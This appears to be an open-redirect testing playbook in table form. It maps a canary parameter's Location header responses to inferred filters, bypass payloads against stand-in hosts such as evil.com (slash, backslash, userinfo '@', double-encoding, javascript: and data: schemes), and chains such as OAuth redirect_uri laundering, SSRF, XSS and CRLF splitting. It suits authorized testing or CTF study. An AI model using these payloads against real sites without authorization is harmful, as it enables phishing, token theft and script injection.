# Decision table — the Location fingerprint → the arm → the verdict

## The primary table — the canary's Location

| The `Location:` on `?next=https://attacker.invalid` | The filter | The next arms |
|---|---|---|
| `Location: https://attacker.invalid` | none/broken | post-probe `confirms` → the chain |
| `Location: /` | a host-block / relative-force | `//`, `/\`, `%5c`, `\\`, `https:`, scheme arms |
| `Location: https://target.com/login` | an allowlist | `@`, `\@`, `target.com.evil.com`, `evil.com/target.com` |
| `Location: https://target.com/x` | a host-force | `target.com@evil.com`, `evil.com\@target.com`, `evil.com/target.com` |
| `Location: evil.com` (relative) | the param resolves relative | a `//`/`scheme` form — `evil.com` alone is same-origin |
| `Location: javascript:...` | the scheme passed | the browser-split check — record the sink-value |
| no `Location:` | the param isn't a redirect | a different param name / a meta/JS carrier |
| `400`/`422` | the param validation rejects | a different param / a relative form to confirm the carrier |

## The bypass-arm → verdict table

| The arm | `Location: <canary>` | `Location: <safe>` |
|---|---|---|
| `//evil.com` | the `//` passes → CANDIDATE | the `//` blocked → try `/\` |
| `/\evil.com` | the `\` passes → CANDIDATE | normalized → try `%5c`/`\\` |
| `\\evil.com` | the `\\` passes → CANDIDATE | normalized → try `/%5c` |
| `https://target.com@evil.com` | the `@` passes → CANDIDATE | userinfo rejected → `\@`/encoded |
| `evil.com\@target.com` | the `\@` passes → CANDIDATE | normalized → encoded `\@` |
| `https://target.com.evil.com` | the subdomain passes → CANDIDATE | the suffix is checked → `eviltarget.com` |
| `https://evil.com/target.com` | the substring-in-path passes → CANDIDATE | the host is checked → the `@` arms |
| `https:evil.com` | the scheme-no-// passes → CANDIDATE | a scheme-`//`-requirement → try `//` |
| `https%3a%2f%2fevil.com` | the decode-order passes → CANDIDATE | the encoded form is checked → the double |
| `https%253a%252f%252fevil.com` | the double-decode passes → CANDIDATE | — |
| `javascript:alert(1)` | the scheme passes → the sink-value | the scheme rejected → `data:`/`blob:` |
| `data:text/html,...` | the data: passes → the sink-value | rejected → `vbscript:`/`about:` |

## The falsifier table — when to stop

| The observation | The verdict |
|---|---|
| `Location: <safe>` on EVERY canary + arm | the class falsifier — close |
| `Location: <safe>` on THIS arm only | a strong-negative — try the next arm |
| no `Location:` on the param | a weak-negative — a different param |
| the meta/JS value is escaped | the client-side twin is closed |
| the confirm + no launder | the class confirms; the chain is the next question |

## The chain-decision table

| The confirmed `Location: <canary>` + the surface | The chain |
|---|---|
| on an allowlisted `redirect_uri` domain | the OAuth launder |
| the fetcher follows `Location` | the SSRF-fetch |
| the sink accepts `javascript:`/`data:` | the XSS |
| a bot visits target.com URLs | the bot-visit |
| the challenge is the phishing shape | the standalone answer |
| a `%0d%0a` reaches the header | the CRLF split |

## The decision-record

`decision: <the-Location-shape>: <the-arm> -> <the-verdict>` — each
fingerprint + the arm tried + the resulting verdict.
